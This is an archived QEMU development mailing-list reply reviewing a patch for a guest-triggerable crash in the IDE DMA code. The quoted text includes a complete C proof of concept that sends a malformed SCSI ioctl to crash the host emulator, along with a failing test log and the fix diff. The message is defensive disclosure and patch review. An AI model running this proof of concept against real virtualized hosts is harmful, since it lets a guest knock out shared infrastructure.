Return-Path: <SRS0=OA/w=ZN=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-8.0 required=3.0 tests=DKIM_INVALID,DKIM_SIGNED,
	HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,
	SPF_HELO_NONE,SPF_PASS,URIBL_BLOCKED,USER_AGENT_SANE_1 autolearn=ham
	autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 819EDC432C0
	for <qemu-devel@archiver.kernel.org>; Thu, 21 Nov 2019 15:05:35 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 49AB1206EC
	for <qemu-devel@archiver.kernel.org>; Thu, 21 Nov 2019 15:05:35 +0000 (UTC)
Authentication-Results: mail.kernel.org;
	dkim=fail reason="signature verification failed" (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="MDcc/mbF"
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 49AB1206EC
Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=redhat.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:41656 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1iXo1W-0007xJ-Dv
	for qemu-devel@archiver.kernel.org; Thu, 21 Nov 2019 10:05:34 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:46262)
 by lists.gnu.org with esmtp (Exim 4.90_1)
 (envelope-from <kwolf@redhat.com>) id 1iXo0J-0007IZ-7K
 for qemu-devel@nongnu.org; Thu, 21 Nov 2019 10:04:20 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <kwolf@redhat.com>) id 1iXo0G-0003xa-LD
 for qemu-devel@nongnu.org; Thu, 21 Nov 2019 10:04:17 -0500
Received: from us-smtp-delivery-1.mimecast.com ([207.211.31.120]:50055
 helo=us-smtp-1.mimecast.com)
 by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
 (Exim 4.71) (envelope-from <kwolf@redhat.com>) id 1iXo0C-0003vj-Nq
 for qemu-devel@nongnu.org; Thu, 21 Nov 2019 10:04:12 -0500
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
 s=mimecast20190719; t=1574348650;
 h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=eNTACw1FdG1ZxsTF+amglgHri/cUR+NOisoOI1Spjzw=;
 b=MDcc/mbFGBXCFBr7j6vgJyf/FT5X9XgMCYhcjpTVHtcFHjxr/D97VNnHgDcHgr7Qpw6NnA
 NZrpHEjL/aZsF/adYmI8eAZ9AUUKElLNfrQ8kuxnUaldRMSqkKnDY1aNRwiHXjkV6Cb0sE
 JuLNoMLWJqS5O2X2/WuzaTJYTymu4jc=
Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
 [209.132.183.4]) (Using TLS) by relay.mimecast.com with ESMTP id
 us-mta-169-Vn9_3oYbN6mvr41T67otdA-1; Thu, 21 Nov 2019 10:04:07 -0500
Received: from smtp.corp.redhat.com (int-mx01.intmail.prod.int.phx2.redhat.com
 [10.5.11.11])
 (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
 (No client certificate requested)
 by mimecast-mx01.redhat.com (Postfix) with ESMTPS id 1616210054E3;
 Thu, 21 Nov 2019 15:04:06 +0000 (UTC)
Received: from linux.fritz.box (ovpn-117-225.ams2.redhat.com [10.36.117.225])
 by smtp.corp.redhat.com (Postfix) with ESMTPS id 9332260141;
 Thu, 21 Nov 2019 15:03:54 +0000 (UTC)
Date: Thu, 21 Nov 2019 16:03:52 +0100
From: Kevin Wolf <kwolf@redhat.com>
To: Alexander Popov <alex.popov@linux.com>
Subject: Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to
 prevent qemu DoS from quests
Message-ID: <20191121150352.GH6007@linux.fritz.box>
References: <20191114172531.10644-1-alex.popov@linux.com>
MIME-Version: 1.0
In-Reply-To: <20191114172531.10644-1-alex.popov@linux.com>
User-Agent: Mutt/1.12.1 (2019-06-15)
X-Scanned-By: MIMEDefang 2.79 on 10.5.11.11
X-MC-Unique: Vn9_3oYbN6mvr41T67otdA-1
X-Mimecast-Spam-Score: 0
Content-Type: text/plain; charset=WINDOWS-1252
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 [fuzzy]
X-Received-From: 207.211.31.120
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Cc: Andrea Arcangeli <aarcange@redhat.com>, sstabellini@kernel.org,
 pmatouse@redhat.com, mdroth@linux.vnet.ibm.com, qemu-block@nongnu.org,
 "Michael S . Tsirkin" <mst@redhat.com>, qemu-stable@nongnu.org,
 qemu-devel@nongnu.org, Kashyap Chamarthy <kashyap.cv@gmail.com>,
 Paolo Bonzini <pbonzini@redhat.com>, John Snow <jsnow@redhat.com>,
 pjp@redhat.com
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

Am 14.11.2019 um 18:25 hat Alexander Popov geschrieben:
> The commit a718978ed58a from July 2015 introduced the assertion which
> implies that the size of successful DMA transfers handled in ide_dma_cb()
> should be multiple of 512 (the size of a sector). But guest systems can
> initiate DMA transfers that don't fit this requirement.
>=20
> PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
> command and crash qemu:
>=20
> #include <stdio.h>
> #include <sys/ioctl.h>
> #include <stdint.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <string.h>
> #include <stdlib.h>
> #include <scsi/scsi.h>
> #include <scsi/scsi_ioctl.h>
>=20
> #define CMD_SIZE 2048
>=20
> struct scsi_ioctl_cmd_6 {
> =09unsigned int inlen;
> =09unsigned int outlen;
> =09unsigned char cmd[6];
> =09unsigned char data[];
> };
>=20
> int main(void)
> {
> =09intptr_t fd =3D 0;
> =09struct scsi_ioctl_cmd_6 *cmd =3D NULL;
>=20
> =09cmd =3D malloc(CMD_SIZE);
> =09if (!cmd) {
> =09=09perror("[-] malloc");
> =09=09return 1;
> =09}
>=20
> =09memset(cmd, 0, CMD_SIZE);
> =09cmd->inlen =3D 1337;
> =09cmd->cmd[0] =3D READ_6;
>=20
> =09fd =3D open("/dev/sg0", O_RDONLY);
> =09if (fd =3D=3D -1) {
> =09=09perror("[-] opening sg");
> =09=09return 1;
> =09}
>=20
> =09printf("[+] sg0 is opened\n");
>=20
> =09printf("[.] qemu should break here:\n");
> =09fflush(stdout);
> =09ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
> =09printf("[-] qemu didn't break\n");
>=20
> =09free(cmd);
>=20
> =09return 1;
> }

It would be nicer to turn the reproducer into a test case for
tests/ide-test.c.

> For fixing that let's check the number of bytes prepared for the transfer
> by the prepare_buf() handler. If it is not a multiple of 512 then end
> the DMA transfer with an error.
>=20
> That also fixes the I/O stall in guests after a DMA transfer request
> for less than the size of a sector.
>=20
> Signed-off-by: Alexander Popov <alex.popov@linux.com>

This patch makes ide-test fail:

  TEST    check-qtest-x86_64: tests/ide-test
**
ERROR:tests/ide-test.c:469:test_bmdma_short_prdt: assertion failed (status =
=3D=3D 0): (0x00000004 =3D=3D 0x00000000)
ERROR - Bail out! ERROR:tests/ide-test.c:469:test_bmdma_short_prdt: asserti=
on failed (status =3D=3D 0): (0x00000004 =3D=3D 0x00000000)

> diff --git a/hw/ide/core.c b/hw/ide/core.c
> index 754ff4dc34..85aac614f0 100644
> --- a/hw/ide/core.c
> +++ b/hw/ide/core.c
> @@ -849,6 +849,7 @@ static void ide_dma_cb(void *opaque, int ret)
>      int64_t sector_num;
>      uint64_t offset;
>      bool stay_active =3D false;
> +    int32_t prepared =3D 0;
> =20
>      if (ret =3D=3D -EINVAL) {
>          ide_dma_error(s);
> @@ -892,12 +893,10 @@ static void ide_dma_cb(void *opaque, int ret)
>      n =3D s->nsector;
>      s->io_buffer_index =3D 0;
>      s->io_buffer_size =3D n * 512;
> -    if (s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size) < =
512) {
> -        /* The PRDs were too short. Reset the Active bit, but don't rais=
e an
> -         * interrupt. */
> -        s->status =3D READY_STAT | SEEK_STAT;
> -        dma_buf_commit(s, 0);
> -        goto eot;
> +    prepared =3D s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer=
_size);
> +    if (prepared % 512) {
> +        ide_dma_error(s);

Which I assume is because you changed the error mode here compared to
the old version.

I'm not sure offhand what the correct behaviour is for non-aligned
values > 512. I think we actually have two cases here: Either a short or
a long PRD. The commit message should explain this with spec references
and a test case should be added for both cases.

Kevin


